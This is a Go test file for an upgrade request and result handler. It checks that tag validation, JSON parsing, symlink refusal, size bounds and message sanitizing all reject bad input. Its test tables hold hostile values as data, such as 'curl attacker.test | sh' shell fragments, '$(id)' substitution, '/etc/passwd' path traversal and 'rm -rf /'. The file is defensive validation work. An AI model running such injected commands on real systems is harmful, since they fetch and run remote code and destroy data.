package upgrade

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestWriteRequest_ThenReadRequest(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	if err := WriteRequest(dir, Request{Tag: "v0.1.4", From: "v0.1.3", RequestedAt: "2026-08-28T12:00:00Z"}); err != nil {
		t.Fatalf("WriteRequest() error = %v", err)
	}

	request, version, err := ReadRequest(dir)
	if err != nil {
		t.Fatalf("ReadRequest() error = %v", err)
	}
	if request.Tag != "v0.1.4" || version.Tag() != "v0.1.4" {
		t.Fatalf("ReadRequest() = %+v / %s, want v0.1.4", request, version)
	}
	if request.From != "v0.1.3" {
		t.Fatalf("ReadRequest().From = %q, want v0.1.3", request.From)
	}

	info, err := os.Stat(RequestPath(dir))
	if err != nil {
		t.Fatalf("Stat() error = %v", err)
	}
	if info.Mode().Perm()&0o077 != 0 {
		t.Fatalf("request file mode = %o, want it readable only by its owner", info.Mode().Perm())
	}
}

func TestWriteRequest_RefusesAnythingButAStableReleaseTag(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		tag  string
	}{
		{name: "empty", tag: ""},
		{name: "no v prefix", tag: "0.1.4"},
		{name: "prerelease", tag: "v0.1.4-rc.1"},
		{name: "a path", tag: "../../../etc/passwd"},
		{name: "a url", tag: "https://attacker.test/payload.tar.gz"},
		{name: "a shell fragment", tag: "v0.1.4; curl attacker.test | sh"},
		{name: "a command substitution", tag: "v0.1.4$(id)"},
		{name: "a newline", tag: "v0.1.4\nv9.9.9"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			dir := stateDir(t)
			if err := WriteRequest(dir, Request{Tag: tt.tag}); err == nil {
				t.Fatalf("WriteRequest(%q) accepted a tag that is not a stable release tag", tt.tag)
			}
			if _, err := os.Stat(RequestPath(dir)); !errors.Is(err, os.ErrNotExist) {
				t.Fatal("WriteRequest() wrote a request file for a refused tag")
			}
		})
	}
}

func TestReadRequest_RefusesEverythingItDoesNotFullyUnderstand(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "not json", content: "v0.1.4"},
		{name: "empty file", content: ""},
		{name: "empty object", content: `{}`},
		{name: "missing tag", content: `{"from":"v0.1.3"}`},
		{name: "prerelease tag", content: `{"tag":"v0.1.4-rc.1"}`},
		{name: "tag without the prefix", content: `{"tag":"0.1.4"}`},
		{name: "tag that is a path", content: `{"tag":"../../etc/passwd"}`},
		{name: "tag that is a url", content: `{"tag":"https://attacker.test/x.tar.gz"}`},
		{name: "tag with a shell fragment", content: `{"tag":"v0.1.4 && curl attacker.test | sh"}`},
		{name: "an unknown field", content: `{"tag":"v0.1.4","url":"https://attacker.test/x.tar.gz"}`},
		{name: "an unknown archive field", content: `{"tag":"v0.1.4","archive":"/etc/shadow"}`},
		{name: "an unknown command field", content: `{"tag":"v0.1.4","command":"rm -rf /"}`},
		{name: "an unknown install path field", content: `{"tag":"v0.1.4","install_path":"/usr/bin/sudo"}`},
		{name: "trailing content", content: `{"tag":"v0.1.4"}{"tag":"v9.9.9"}`},
		{name: "a json array", content: `[{"tag":"v0.1.4"}]`},
		{name: "a malformed from", content: `{"tag":"v0.1.4","from":"nonsense"}`},
		{name: "a malformed requested_at", content: `{"tag":"v0.1.4","requested_at":"yesterday"}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			dir := stateDir(t)
			if err := os.WriteFile(RequestPath(dir), []byte(tt.content), 0o600); err != nil {
				t.Fatalf("WriteFile() error = %v", err)
			}

			if _, _, err := ReadRequest(dir); err == nil {
				t.Fatalf("ReadRequest() accepted %q", tt.content)
			}
		})
	}
}

func TestReadRequest_ReportsNoRequestWhenThereIsNone(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	if _, _, err := ReadRequest(dir); !errors.Is(err, ErrNoRequest) {
		t.Fatalf("ReadRequest() error = %v, want ErrNoRequest", err)
	}
}

func TestReadRequest_RefusesASymlinkedRequestFile(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	elsewhere := filepath.Join(t.TempDir(), "planted.json")
	if err := os.WriteFile(elsewhere, []byte(`{"tag":"v9.9.9"}`), 0o600); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}
	if err := os.Symlink(elsewhere, RequestPath(dir)); err != nil {
		t.Fatalf("Symlink() error = %v", err)
	}

	if _, _, err := ReadRequest(dir); err == nil || errors.Is(err, ErrNoRequest) {
		t.Fatalf("ReadRequest() error = %v, want a refusal for a symlinked request file", err)
	}
}

func TestReadRequest_BoundsTheFileSize(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	padded := `{"tag":"v0.1.4","from":"` + strings.Repeat("a", maxHandoffBytes) + `"}`
	if err := os.WriteFile(RequestPath(dir), []byte(padded), 0o600); err != nil {
		t.Fatalf("WriteFile() error = %v", err)
	}

	if _, _, err := ReadRequest(dir); err == nil {
		t.Fatal("ReadRequest() accepted a request file past the size bound")
	}
}

func TestRemoveRequest_IsIdempotent(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	if err := RemoveRequest(dir); err != nil {
		t.Fatalf("RemoveRequest() on an empty directory error = %v", err)
	}
	if err := WriteRequest(dir, Request{Tag: "v0.1.4"}); err != nil {
		t.Fatalf("WriteRequest() error = %v", err)
	}
	if err := RemoveRequest(dir); err != nil {
		t.Fatalf("RemoveRequest() error = %v", err)
	}
	if _, _, err := ReadRequest(dir); !errors.Is(err, ErrNoRequest) {
		t.Fatalf("ReadRequest() after RemoveRequest() error = %v, want ErrNoRequest", err)
	}
}

func TestResult_RoundTrip(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)

	if _, found, err := ReadResult(dir); err != nil || found {
		t.Fatalf("ReadResult() on an empty directory = found %v, error %v", found, err)
	}

	want := Result{
		Status:     ResultSucceeded,
		Tag:        "v0.1.4",
		From:       "v0.1.3",
		Message:    "Installed v0.1.4 and restarted oberwatch.",
		FinishedAt: "2026-08-28T12:00:05Z",
	}
	if err := WriteResult(dir, want); err != nil {
		t.Fatalf("WriteResult() error = %v", err)
	}

	got, found, err := ReadResult(dir)
	if err != nil || !found {
		t.Fatalf("ReadResult() = found %v, error %v", found, err)
	}
	if got != want {
		t.Fatalf("ReadResult() = %+v, want %+v", got, want)
	}

	info, err := os.Stat(ResultPath(dir))
	if err != nil {
		t.Fatalf("Stat() error = %v", err)
	}
	if info.Mode().Perm()&0o004 == 0 {
		t.Fatalf("result file mode = %o, want the unprivileged service to be able to read what root wrote", info.Mode().Perm())
	}
}

func TestWriteResult_RefusesAnUnknownStatus(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	if err := WriteResult(dir, Result{Status: ResultStatus("done"), Tag: "v0.1.4"}); err == nil {
		t.Fatal("WriteResult() accepted a status this package does not write")
	}
}

func TestReadResult_TreatsAnUnusableResultAsNoResult(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name    string
		content string
	}{
		{name: "not json", content: "succeeded"},
		{name: "unknown status", content: `{"status":"pwned","tag":"v0.1.4"}`},
		{name: "no status", content: `{"tag":"v0.1.4"}`},
		{name: "no tag", content: `{"status":"succeeded"}`},
		{name: "a tag that is a path", content: `{"status":"succeeded","tag":"../../etc"}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			dir := stateDir(t)
			if err := os.WriteFile(ResultPath(dir), []byte(tt.content), 0o644); err != nil {
				t.Fatalf("WriteFile() error = %v", err)
			}

			result, found, err := ReadResult(dir)
			if found {
				t.Fatalf("ReadResult() reported %+v as a usable result", result)
			}
			if err == nil {
				t.Fatal("ReadResult() gave no error for a result it could not use")
			}
		})
	}
}

func TestSanitizeMessage(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name string
		raw  string
		want string
	}{
		{name: "plain text is kept", raw: "Installed v0.1.4.", want: "Installed v0.1.4."},
		{name: "newlines collapse to spaces", raw: "line one\nline two", want: "line one line two"},
		{name: "tabs and returns collapse", raw: "a\tb\r\nc", want: "a b c"},
		{name: "repeated whitespace collapses", raw: "a     b", want: "a b"},
		{name: "surrounding whitespace is trimmed", raw: "  padded  ", want: "padded"},
		{name: "control characters are dropped", raw: "clean\x07\x1b[31mtext", want: "clean[31mtext"},
		{name: "a null byte is dropped", raw: "before\x00after", want: "beforeafter"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			if got := sanitizeMessage(tt.raw); got != tt.want {
				t.Fatalf("sanitizeMessage(%q) = %q, want %q", tt.raw, got, tt.want)
			}
		})
	}
}

func TestSanitizeMessage_BoundsTheLength(t *testing.T) {
	t.Parallel()

	got := sanitizeMessage(strings.Repeat("a", maxMessageRunes*2))
	if len([]rune(got)) > maxMessageRunes+1 {
		t.Fatalf("sanitizeMessage() returned %d runes, want it bounded to %d", len([]rune(got)), maxMessageRunes+1)
	}
}

func TestWriteFileAtomic_LeavesNoTemporaryFileBehind(t *testing.T) {
	t.Parallel()

	dir := stateDir(t)
	if err := writeFileAtomic(filepath.Join(dir, "value.json"), []byte(`{"a":1}`), 0o600); err != nil {
		t.Fatalf("writeFileAtomic() error = %v", err)
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("ReadDir() error = %v", err)
	}
	if len(entries) != 1 || entries[0].Name() != "value.json" {
		t.Fatalf("directory holds %d entries, want only the written file", len(entries))
	}
}

func TestResultStatus_Valid(t *testing.T) {
	t.Parallel()

	tests := []struct {
		status ResultStatus
		want   bool
	}{
		{status: ResultSucceeded, want: true},
		{status: ResultRestartRequired, want: true},
		{status: ResultFailed, want: true},
		{status: ResultStatus(""), want: false},
		{status: ResultStatus("succeeded "), want: false},
		{status: ResultStatus("SUCCEEDED"), want: false},
	}

	for _, tt := range tests {
		t.Run(string(tt.status), func(t *testing.T) {
			t.Parallel()

			if got := tt.status.Valid(); got != tt.want {
				t.Fatalf("ResultStatus(%q).Valid() = %v, want %v", tt.status, got, tt.want)
			}
		})
	}
}
